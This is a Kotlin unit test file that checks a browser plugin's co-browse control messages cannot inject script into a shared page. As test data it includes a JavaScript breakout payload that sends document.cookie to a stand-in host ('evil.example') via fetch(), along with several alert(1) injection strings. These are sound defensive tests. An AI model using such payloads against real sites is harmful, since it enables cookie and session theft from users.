package ai.rever.boss.plugin.browser

import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * [CoBrowseScripts.applyControl] splices its argument verbatim into an IIFE call that
 * [BrowserHandleImpl.applyCoBrowseControl] runs via `executeJavaScript` - and that
 * argument is documented as coming from a controlling remote viewer, over a wire format
 * this repo does not define. Before the fix under test, a malformed value could close the
 * call's argument list and append further JS statements, running arbitrary script in the
 * shared page's real origin - turning "click/type/scroll on my behalf" into full script
 * execution. These tests assert a breakout payload cannot survive into the generated
 * script, and that legitimate control messages still work.
 */
class CoBrowseScriptsTest {
    // Syntactically valid JSON followed by a JS statement separator and a call - if this
    // ever reached the page verbatim, it would close applyControl's IIFE argument list and
    // run the attacker's fetch() as a sibling statement.
    private val breakoutPayload =
        """{"kind":"input","id":1,"value":"x"}); fetch('https://evil.example/c?'+document.cookie); """ +
            """(function(){return(0"""

    @Test
    fun `unquoted JavaScript expressions are rejected at every nesting depth`() {
        val payloads =
            listOf(
                """{"kind":alert(1)}""",
                """{"kind":"click","id":(globalThis.injected=1)}""",
                """{"kind":"input","value":{"nested":alert(1)}}""",
                """{"kind":"input","value":[alert(1)]}""",
            )
        for (payload in payloads) {
            assertEquals(
                """(function(){ return "invalid"; })();""",
                CoBrowseScripts.applyControl(payload),
                payload,
            )
        }
    }

    @Test
    fun `invalid JSON number tokens are rejected`() {
        for (token in listOf("NaN", "Infinity", "undefined", "+1", "01", "0x10", "1.", ".1")) {
            assertEquals(
                """(function(){ return "invalid"; })();""",
                CoBrowseScripts.applyControl("""{"id":$token}"""),
                token,
            )
        }
    }

    @Test
    fun `valid nested JSON primitives and exponent numbers remain supported`() {
        val payload = """{"kind":"scroll","id":1,"x":-0.25e+2,"y":1E3,"data":[true,false,null,{"x":"alert(1)"}]}"""
        assertTrue(CoBrowseScripts.applyControl(payload).endsWith("})($payload);"))
    }

    @Test
    fun `Unicode line separators stay inside string data on modern Chromium`() {
        val payload = "{\"kind\":\"input\",\"value\":\"before\u2028middle\u2029after\"}"
        // executeJavaScript uses Chromium's ES2019+ JSON-superset string grammar.
        assertTrue(CoBrowseScripts.applyControl(payload).endsWith("})($payload);"))
    }

    @Test
    fun `a payload that is not syntactically complete JSON cannot break out of the IIFE call`() {
        val script = CoBrowseScripts.applyControl(breakoutPayload)

        assertFalse(script.contains("evil.example"), "the raw payload must never reach the generated script")
        assertFalse(script.contains("fetch("), "no injected call may appear in the generated script")
        assertEquals("""(function(){ return "invalid"; })();""", script)
    }

    @Test
    fun `a JSON array or scalar at the top level is rejected, not merely non-object`() {
        // These are syntactically valid, complete JSON - safe to splice - but not the
        // documented `{"kind":...}` object shape the in-page switch expects.
        for (payload in listOf("""["kind","click"]""", """"click"""", "42", "null", "true")) {
            val script = CoBrowseScripts.applyControl(payload)
            assertTrue(
                script.contains(""""invalid""""),
                "a non-object top-level JSON value ($payload) must be rejected, got: $script",
            )
        }
    }

    @Test
    fun `trailing garbage after a complete JSON object is rejected`() {
        val script = CoBrowseScripts.applyControl("""{"kind":"click","id":1}garbage""")
        assertTrue(script.contains(""""invalid""""))
    }

    @Test
    fun `unparseable input is rejected`() {
        val script = CoBrowseScripts.applyControl("""{"kind": not json at all""")
        assertTrue(script.contains(""""invalid""""))
    }

    @Test
    fun `a legitimate click event round-trips into the generated script`() {
        val script = CoBrowseScripts.applyControl("""{"kind":"click","id":42}""")
        assertFalse(script.contains(""""invalid""""))
        assertTrue(script.contains(""""kind":"click""""))
        assertTrue(script.contains(""""id":42"""))
        assertTrue(script.endsWith("""})({"kind":"click","id":42});"""))
    }

    @Test
    fun `a value containing quotes and backslashes round-trips as inert JSON data, not injected script`() {
        // A viewer typing this into a text field must land as the literal string value,
        // never as JS the switch's 'input' case executes.
        val typed = """quote " backslash \ and a fake close"); alert(1); ("""
        val payload =
            kotlinx.serialization.json
                .buildJsonObject {
                    put("kind", kotlinx.serialization.json.JsonPrimitive("input"))
                    put("id", kotlinx.serialization.json.JsonPrimitive(7))
                    put("value", kotlinx.serialization.json.JsonPrimitive(typed))
                }.toString()

        val script = CoBrowseScripts.applyControl(payload)

        assertFalse(script.contains(""""invalid""""))
        // The security property is not "alert(1) is absent" - it legitimately appears as
        // inert text inside the quoted "value" field, which is correct and safe. What must
        // hold is that the embedded quote and backslash stayed inside that one JSON string
        // (re-escaped, not raw) rather than terminating it early.
        assertTrue(script.endsWith("})($payload);"))
        val embeddedValue =
            Regex(""""value":"((?:[^"\\]|\\.)*)"""").find(script)?.groupValues?.get(1)
                ?: error("expected an escaped \"value\" field in: $script")
        assertTrue(embeddedValue.contains("\\\""), "the embedded double-quote must be escaped, not raw")
        assertTrue(embeddedValue.contains("\\\\"), "the embedded backslash must be escaped, not raw")
    }
}
